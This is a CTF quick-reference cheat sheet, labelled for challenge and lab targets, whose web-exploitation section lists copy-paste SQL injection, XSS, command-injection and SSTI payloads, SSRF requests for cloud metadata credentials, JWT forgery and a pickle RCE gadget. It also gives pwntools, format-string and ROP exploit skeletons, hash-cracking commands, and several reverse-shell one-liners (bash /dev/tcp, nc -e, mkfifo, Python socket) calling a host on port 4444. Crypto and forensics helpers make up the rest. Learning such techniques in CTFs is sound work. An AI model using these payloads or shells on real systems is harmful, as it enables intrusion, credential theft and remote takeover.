---
title: "CTF Cheat Sheets Collection"
description: "Copy-paste CTF quick reference: SQLi, sqlmap, XSS, SSRF, SSTI, JWT, NoSQL, deserialization, prototype pollution; hash cracking, RSA and XOR helpers; pwntools, format strings and ROP; stego, PCAP, memory and disk forensics."
tags:
  - ctf
  - cheatsheet
  - reference
  - quickstart
  - commands
updated: 2026-11-07
---

# 🚀 CTF Cheat Sheets Collection

Quick reference guides for common CTF challenge types and techniques. Decision flow per category: [[CTF_Challenge_Methodology|Methodology]]. Installs: [[CTF_Tools]].

> **CTF and lab targets only.** Run these against challenge infrastructure you are authorized to attack. See [[sop-legal-ethics|Legal & Ethics]].

---

## 🌐 Web Exploitation

Deeper coverage: [[sop-web-application-security|Web Application Security SOP]].

### SQL Injection
```sql
-- MySQL needs a space after "--": end payloads with "-- -" or "#"

-- Authentication bypass
admin'-- -
admin'#
' OR '1'='1'-- -
' OR 1=1-- -

-- UNION-based: find the column count first, then match it
' ORDER BY 3-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT username,password FROM users-- -

-- Time-based blind: MySQL
' AND SLEEP(5)=0-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
-- Time-based blind: PostgreSQL
'||pg_sleep(5)--
-- Time-based blind: MSSQL (stacked query)
'; WAITFOR DELAY '0:0:5'--
-- Time-based blind: SQLite (no sleep function, use a heavy query)
' AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--

-- Boolean-based blind: compare true/false responses
' AND 1=1-- -
' AND 1=2-- -
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

### sqlmap
```bash
TARGET=192.0.2.10   # challenge host
sqlmap -u "http://$TARGET/item.php?id=1" --batch --dbs
sqlmap -u "http://$TARGET/item.php?id=1" --batch -D shop -T users --dump
sqlmap -u "http://$TARGET/login.php" --data "user=a&pass=b" --batch
sqlmap -r request.txt --batch --level 5 --risk 3   # raw request saved from Burp
```

### XSS (Cross-Site Scripting)
```html
<!-- Basic payload -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>

<!-- Bypass filters -->
<ScRiPt>alert('XSS')</ScRiPt>
javascript:alert('XSS')
<svg/onload=alert('XSS')>
```

### Directory Traversal
```text
# Basic payloads
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Double encoding
%252e%252e%252f
```

### Command Injection
```text
# Basic payloads
; ls -la
| whoami
&& cat /etc/passwd
`id`
$(whoami)

# Bypassing filters
ls${IFS}/
cat${IFS}/etc/passwd
{ls,-la}
```

### SSRF
```text
# Localhost filter bypasses
http://127.0.0.1/   http://127.1/   http://2130706433/   http://017700000001/   http://[::1]/

# Cloud metadata (put these in the vulnerable url= parameter)
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/                   # GCP: needs header Metadata-Flavor: Google
http://169.254.169.254/metadata/instance?api-version=2021-02-01      # Azure: needs header Metadata: true
```
```bash
# AWS IMDSv2: PUT for a token first (the SSRF must pass PUT + custom headers)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### SSTI (Server-Side Template Injection)
```text
# Detection ladder: which one evaluates?
{{7*7}}       -> 49        Jinja2, Twig, ...
${7*7}        -> 49        FreeMarker, Mako, ...
<%= 7*7 %>    -> 49        ERB (Ruby)
{{7*'7'}}     -> 7777777 = Jinja2, 49 = Twig

# Jinja2 (Flask): dump app config, then a command-execution canary
{{ config.items() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### JWT
```bash
# Decode header + payload (base64url, padding stripped)
python3 -c 'import sys,base64,json; [print(json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))) for p in sys.argv[1].split(".")[:2]]' "$JWT"

# Crack a weak HS256 secret
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt

# alg:none: header {"alg":"none","typ":"JWT"}, empty signature, keep the trailing dot
# e.g. eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.
python3 jwt_tool.py "$JWT" -X a

# Alg confusion RS256 -> HS256: HMAC-sign with the server's public key as the secret
python3 jwt_tool.py "$JWT" -X k -pk public.pem
```

### NoSQL Injection (MongoDB)
```text
# JSON body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": "^a"}}

# URL-encoded params, if the backend parses brackets into objects (e.g. PHP)
username[$ne]=x&password[$ne]=x
```

### Insecure Deserialization
```python
# Python pickle: __reduce__ runs on pickle.loads(). This canary runs `id`.
# Build on the same OS family as the target (os.system pickles as posix.system / nt.system).
import base64, os, pickle

class Canary:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(Canary())).decode())
```
PHP gadget chains: [phpggc](https://github.com/ambionics/phpggc). Java: [ysoserial](https://github.com/frohoff/ysoserial).

### Prototype Pollution (Node.js)
```text
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

# Safe probe on Express: JSON responses become indented if polluted
{"__proto__": {"json spaces": 10}}
```

---

## 🔐 Cryptography

### Common Encodings
```bash
# Base64
echo "text" | base64
echo "dGV4dA==" | base64 -d

# Hex
echo "text" | xxd -p
echo "74657874" | xxd -r -p

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('text'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('text%20here'))"

# ASCII to decimal
python3 -c "print(' '.join(str(ord(c)) for c in 'text'))"
python3 -c "print(''.join(chr(int(x)) for x in '116 101 120 116'.split()))"
```

### Caesar Cipher
```python
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            shifted = ord(char) - shift
            if char.isupper():
                if shifted < ord('A'):
                    shifted += 26
            else:
                if shifted < ord('a'):
                    shifted += 26
            result += chr(shifted)
        else:
            result += char
    return result

# Brute force all shifts
for i in range(26):
    print(f"Shift {i}: {caesar_decrypt('KHOOR ZRUOG', i)}")
```

### ROT13
```bash
echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
python3 -c "import codecs; print(codecs.encode('text', 'rot13'))"
```

### Hash Identification

| Hash | Hex length / prefix | hashcat `-m` |
|---|---|---|
| MD5 | 32 | 0 |
| NTLM | 32 | 1000 |
| SHA1 | 40 | 100 |
| SHA-256 | 64 | 1400 |
| SHA-512 | 128 | 1700 |
| md5crypt | `$1$` | 500 |
| sha512crypt | `$6$` | 1800 |
| bcrypt | `$2a$` / `$2b$` / `$2y$` | 3200 |

```bash
hashcat --identify hash.txt   # list candidate modes (MD5 vs NTLM look identical)
nth --text '5f4dcc3b5aa765d61d8327deb882cf99'   # name-that-hash: hashcat + John names
```

### Hash Cracking
```bash
# Kali ships rockyou gzipped: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 3 hash.txt '?l?l?l?l?d?d'   # mask: 4 lowercase + 2 digits
hashcat -m 0 hash.txt --show                # print cracked results

john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
john --show --format=Raw-MD5 hash.txt
zip2john secret.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
ssh2john id_rsa > ssh.hash && john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

### RSA Quick Attacks
```python
from math import gcd, isqrt

def iroot(x, n):                       # floor of the n-th root (or gmpy2.iroot(x, n))
    lo, hi = 0, 1 << (x.bit_length() // n + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid ** n <= x:
            lo = mid
        else:
            hi = mid - 1
    return lo

def fermat(n):                         # fast when p and q are close together
    a = isqrt(n)
    if a * a < n:
        a += 1
    while True:
        b = isqrt(a * a - n)
        if b * b == a * a - n:
            return a - b, a + b
        a += 1

def rsa_decrypt(c, p, q, e=65537):
    d = pow(e, -1, (p - 1) * (q - 1))  # modular inverse needs Python 3.8+
    return pow(c, d, p * q)

def to_bytes(m):
    return m.to_bytes((m.bit_length() + 7) // 8, "big")

# Small e, no padding (m**e < n):  to_bytes(iroot(c, e))
# Two moduli share a prime:        p = gcd(n1, n2); q = n1 // p
# Close primes:                    p, q = fermat(n); to_bytes(rsa_decrypt(c, p, q, e))
```
Known factors of N: [factordb](https://factordb.com/). Automated attacks: [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) (`RsaCtfTool --publickey key.pub --private`).

### XOR
```python
from itertools import cycle
from string import ascii_letters

def xor(data: bytes, key: bytes) -> bytes:       # repeating-key XOR
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def single_byte_xor(ct: bytes, top=3):           # rank keys by letters/spaces in output
    good = set((ascii_letters + " ").encode())
    ranked = sorted(((sum(c in good for c in xor(ct, bytes([k]))), k) for k in range(256)), reverse=True)
    for score, k in ranked[:top]:
        print(hex(k), xor(ct, bytes([k])))

# Known plaintext: xor(ct[:5], b"flag{") reveals the start of the key
```

### AES-ECB Detection
```python
def looks_like_ecb(ct: bytes, bs=16) -> bool:   # repeated plaintext blocks -> repeated ciphertext blocks
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    return len(blocks) != len(set(blocks))
```

---

## 💾 Binary Exploitation & Reverse Engineering

### GDB Commands
```text
# Basic debugging
gdb ./binary
(gdb) break main
(gdb) run
(gdb) step
(gdb) continue

# Examine memory
(gdb) x/20x $rsp        # Examine stack
(gdb) x/20i $rip        # Disassemble from current instruction
(gdb) info registers    # Show all registers

# Pwndbg enhancements
(gdb) checksec          # Security mitigations
(gdb) vmmap             # Memory mappings
(gdb) cyclic 200        # Create cyclic pattern
(gdb) cyclic -l laaa    # Offset of a 4-byte chunk (or a value: cyclic -l 0x6161616c)
(gdb) cyclic -d         # Detect pattern offsets in registers after the crash
```

### Binary Analysis
```bash
# File information
file binary
objdump -d binary
readelf -h binary

# Security mitigations
pwn checksec ./binary      # pwntools
checksec --file=./binary   # checksec.sh 2.x (Kali); 3.x syntax: checksec file ./binary
```

### Cyclic Patterns (Offset Finding)
```bash
pwn cyclic 200 > pattern.txt   # de Bruijn pattern, 4-byte subsequences by default
pwn cyclic -l 0x6161616c       # crashed value -> offset (44); 'laaa' works too
pwn cyclic -n 8 200            # 8-byte subsequences: look up with -n 8 as well
```
```python
from pwn import *
io = process("./vuln"); io.sendline(cyclic(200)); io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))   # x86-64: ret faulted with RSP on the pattern
```

### pwntools Exploit Skeleton
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)

def start():
    if args.REMOTE:                      # python3 solve.py REMOTE
        return remote("chall.example.com", 1337)
    if args.GDB:                         # python3 solve.py GDB
        return gdb.debug(exe.path, gdbscript="break main\ncontinue")
    return process(exe.path)

io = start()
offset = 72                              # from cyclic_find()
ret = ROP(exe).find_gadget(["ret"]).address   # x86-64 system()/win() crashing on movaps? one extra ret realigns the stack
payload = flat({offset: [ret, exe.sym.win]})
io.recvuntil(b"> ")
io.send(payload)
io.interactive()
```

### Format Strings
```text
%p.%p.%p.%p.%p.%p.%p.%p     leak stack words
AAAAAAAA%6$p                find your buffer: the N that prints 0x4141414141414141
%7$s                        read the string at the pointer in argument 7
%7$n  %7$hn  %7$hhn         write 4 / 2 / 1 bytes (= characters printed so far)
```
```python
# Uses `exe` from the skeleton above
def send_fmt(p):
    io = process(exe.path); io.sendline(p); return io.recvall()

offset = FmtStr(send_fmt).offset                                # auto-find the argument index
payload = fmtstr_payload(offset, {exe.got.puts: exe.sym.win})   # GOT overwrite (needs Partial RELRO)
```

### ROP, libc & Sandbox
```bash
ROPgadget --binary ./vuln --only "pop|ret"
ROPgadget --binary ./vuln | grep "pop rdi"
ropper --file ./vuln --search "pop rdi"
one_gadget ./libc.so.6                                   # execve("/bin/sh") offsets + constraints

pwninit                                                  # in a dir with binary + libc: fetch ld, patch, write solve.py
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./vuln # or by hand
patchelf --replace-needed libc.so.6 ./libc.so.6 ./vuln

seccomp-tools dump ./vuln                                # allowed syscalls (open/read/write-only challenges)
```

### Common Assembly Instructions
```assembly
; x86-64 calling convention
; Arguments: RDI, RSI, RDX, RCX, R8, R9
; Return value: RAX

; Stack frame setup
push rbp
mov rbp, rsp

; Function call
call function
; or
mov rax, function_address
call rax

; System call (x86-64)
mov rax, syscall_number
mov rdi, arg1
mov rsi, arg2
mov rdx, arg3
syscall
```

---

## 🕵️ Forensics

### File Analysis
```bash
# File type identification
file filename
xxd filename | head

# Metadata extraction
exiftool image.jpg
strings filename | grep -i flag

# Binwalk for embedded files (v2.4.3; Kali's v3 Rust rewrite is the separate binwalk3 command)
binwalk filename
binwalk -e filename     # extract to _filename.extracted/
binwalk -Me filename    # recursive extraction
binwalk3 -e filename    # v3: extracts to extractions/filename.extracted/

# Foremost file carving
foremost -i image.dd
```

### Image Forensics
```bash
# Steganography
steghide extract -sf image.jpg                         # JPEG/BMP/WAV/AU, asks for a passphrase
stegseek image.jpg /usr/share/wordlists/rockyou.txt    # crack the steghide passphrase
zsteg -a image.png                                     # PNG/BMP: LSB and bit-plane checks
java -jar stegsolve.jar                                # GUI: step through bit planes / channels
```
```python
# Manual LSB: red channel, row by row, MSB-first bytes (zsteg tries every combination)
from PIL import Image
raw = Image.open("image.png").convert("RGB").tobytes()   # R,G,B,R,G,B,...
bits = "".join(str(b & 1) for b in raw[0::3])
data = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) - 7, 8))
print(data[:64])
```

### Network Analysis (Wireshark)
```text
# Display filters
http                    # HTTP traffic only
tcp.port == 80          # Traffic on port 80
ip.addr == 192.168.1.1  # Traffic to/from specific IP
dns                     # DNS queries only
ftp-data                # FTP data transfer

# Export objects
File -> Export Objects -> HTTP/FTP/SMB

# Follow streams
Right-click packet -> Follow -> TCP Stream
```
```bash
tshark -r cap.pcap --export-objects http,outdir   # also dicom, ftp-data, imf, smb, tftp
tshark -r cap.pcap -q -z follow,tcp,ascii,0       # TCP stream 0 as text
tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.request.uri
```

### Memory (Volatility 3)
```bash
vol -f mem.raw windows.info
vol -f mem.raw windows.pslist
vol -f mem.raw windows.pstree
vol -f mem.raw windows.cmdline
vol -f mem.raw windows.filescan | grep -i flag
```

### Disk Images (Sleuth Kit)
```bash
mmls disk.img                       # partition table: note the start sector
fls -r -o 2048 disk.img             # recursive file list for the FS at sector 2048 (-d: deleted only)
icat -o 2048 disk.img 1234 > out    # extract by inode number from fls
```

---

## 📡 Network & Protocols

### Port Scanning
```bash
TARGET=192.0.2.10                     # challenge host
nmap -sS -O "$TARGET"                 # SYN scan with OS detection
nmap -sV -A "$TARGET"                 # Version detection and aggressive scan
nmap -p- "$TARGET"                    # Scan all ports
nmap -sU -p 53,67,68,123 "$TARGET"    # UDP scan specific ports
```

### Protocol Analysis
```bash
# TCP connection (manual HTTP request)
printf 'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' "$TARGET" | nc "$TARGET" 80

# UDP communication
nc -u "$TARGET" 53

# Banner grabbing
telnet "$TARGET" 21
telnet "$TARGET" 22
telnet "$TARGET" 25
```

---

## 🐍 Python Quick Scripts

### Number Base Conversions
```python
def convert_bases(s):                  # try each base on its own; skip the ones that don't parse
    for name, base in (("dec", 10), ("bin", 2), ("oct", 8), ("hex", 16)):
        try:
            n = int(s, base)
        except ValueError:
            continue
        print(f"as {name}: {n}  -> hex {n:#x}, bin {n:#b}")

convert_bases("101")
```

---

## 🔧 One-Liners & Bash Scripts

### File Operations
```bash
# Find files by pattern
find / -name "*flag*" 2>/dev/null
find . -type f -exec grep -l "flag{" {} \; 2>/dev/null

# Extract strings with specific pattern
grep -r "flag{" /path/to/search/
grep -oE "flag\{[^}]+\}" file.txt

# Monitor file changes
inotifywait -m /path/to/watch -e modify,create,delete
```

### Reverse Shells (lab use)
```bash
# Listener: ncat -lvnp 4444
bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
nc -e /bin/bash 192.0.2.10 4444    # needs ncat or netcat-traditional; OpenBSD nc (Debian/Kali default) has no -e
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f   # OpenBSD nc
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.0.2.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Upgrade to a PTY once connected
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Data Extraction
```bash
# Extract data between markers
sed -n '/BEGIN/,/END/p' file.txt
awk '/BEGIN/,/END/' file.txt

# Base64 decode from file
cat file.txt | tr -d '\n' | base64 -d

# URL decode
python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.argv[1]))" "$url"

# Extract emails from text
grep -oE '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b' file.txt
```

---

## 🎯 CTF-Specific Commands

### Flag Formats
```bash
# Common formats: flag{...}  FLAG{...}  ctf{...}  <event>{...}
grep -rE "flag\{[^}]+\}" /path/
grep -rE "[A-Za-z0-9_]+\{[^}]+\}" /path/
```

### Quick Wins
```bash
ls -la                        # hidden files in the current dir
find . -name ".*" -type f     # hidden files below it
env | grep -i flag            # flags planted in environment variables
```

---

## 🔗 Useful Resources

### Online Tools
- **CyberChef**: https://gchq.github.io/CyberChef/
- **dcode.fr**: https://www.dcode.fr/en (cipher identification)
- **Hash Analyzer**: https://www.tunnelsup.com/hash-analyzer/
- **factordb**: https://factordb.com/ (known factorisations of RSA moduli)
- **Regex101**: https://regex101.com/
- **ASCII Table**: https://www.asciitable.com/

### Payload Databases
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **SecLists**: https://github.com/danielmiessler/SecLists
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/

### Practice Platforms
- **CyLab Security Academy** (formerly picoCTF.org): https://cylabacademy.org/
- **OverTheWire**: https://overthewire.org/
- **TryHackMe**: https://tryhackme.com/
- **Hack The Box**: https://www.hackthebox.com/
- **CryptoHack**: https://cryptohack.org/
- **pwn.college**: https://pwn.college/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **CTFtime** (event calendar): https://ctftime.org/

Environment setup (venv, wordlists, installs): [[CTF_Tools]].

---

*Keep this handy during CTF events!*

---

**Last Updated:** 2026-11-07
